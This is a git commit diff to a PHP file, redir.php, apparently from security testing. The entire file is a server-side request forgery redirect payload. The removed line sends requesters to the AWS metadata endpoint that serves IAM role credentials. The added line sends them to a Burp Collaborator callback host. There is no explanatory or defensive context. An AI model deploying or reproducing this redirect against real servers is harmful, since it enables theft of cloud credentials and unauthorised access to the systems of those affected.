419307260c2d51f9d99b7404c9fe84ef74216e50
anishacks <66885893+anishacks@users.noreply.github.com>
2021-03-25 22:58:02 +0530

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,1 +1,1 @@
-<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name', TRUE, 200); ?>
+<?php header('Location: http://41350gcml1iij6k5le2efz33fulk99.burpcollaborator.net/latest/meta-data/iam/security-credentials/role-name', TRUE, 200); ?>
